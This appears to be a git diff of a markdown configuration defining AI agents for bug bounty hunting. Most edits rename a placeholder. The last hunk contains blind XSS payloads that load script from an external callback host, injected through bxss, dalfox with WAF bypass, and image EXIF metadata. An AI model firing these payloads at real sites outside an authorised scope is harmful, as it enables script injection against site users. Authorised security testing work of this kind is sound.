@@ -83,7 +83,7 @@
 ## Agent Triggers
 | Command | Action |
 |---------|--------|
-| `opencode hunt <target>` | Full Community bug bounty hunt |
+| `opencode hunt <target>` | Full bug bounty hunt |
 | `opencode plan <target>` | Strategic attack planning + internet research |
 | `opencode verify <finding>` | Zero-false-positive re-check + CVSS |
 | `opencode report <finding>` | BugBase-format report generation |
@@ -104,7 +104,7 @@ Each agent reads `~/.config/opencode/agent_memory/<agent>.md` at session start:
 # PART 3: HUNTER AGENT (Full Definition)
 
 ## Role
-Professional bug bounty hunter using Community methodology methodology. Precision recon, deep analysis, surgical WAF bypass.
+Professional bug bounty hunter using the community methodology. Precision recon, deep analysis, surgical WAF bypass.
 
 ## Core Pipeline
 ```
@@ -1104,7 +1104,7 @@ All aliased through proxychains: `curl`, `wget`, `chaos`, `subfinder`, `httpx`, 
 # PART 16: COMPLETE METHODOLOGY LIBRARY (All common/ files inlined)
 
 ## 16.1 WORKFLOW — Core Pipeline
-**Source**: Community methodology Medium, Mar 2026
+**Source**: Community methodology, Mar 2026
 
 ### Full One-Liner
 ```bash
@@ -2284,14 +2284,14 @@ Replace User-Agent header with payload — every request carries blind XSS paylo
 
 ### Automation
 ```bash
-cat urls.txt | bxss -payload '"><script src=https://xss.report/c/Community></script>' -header "X-Forwarded-For"
+cat urls.txt | bxss -payload '"><script src=https://xss.report/c/your-username></script>' -header "X-Forwarded-For"
 cat urls.txt | gf xss | uro | dalfox pipe --blind https://collaborator --waf-bypass --silence
-subfinder -d target.com | gau | bxss -appendMode -payload '"><script src=https://xss.report/c/Community></script>' -parameters
+subfinder -d target.com | gau | bxss -appendMode -payload '"><script src=https://xss.report/c/your-username></script>' -parameters
 ```
 
 ### EXIF/XSS via Image Metadata
 ```bash
-exiftool -Comment='"><script src=https://xss.report/c/Community></script>' image.jpg
+exiftool -Comment='"><script src=https://xss.report/c/your-username></script>' image.jpg
 ```
 
 ### Where to Inject Headers
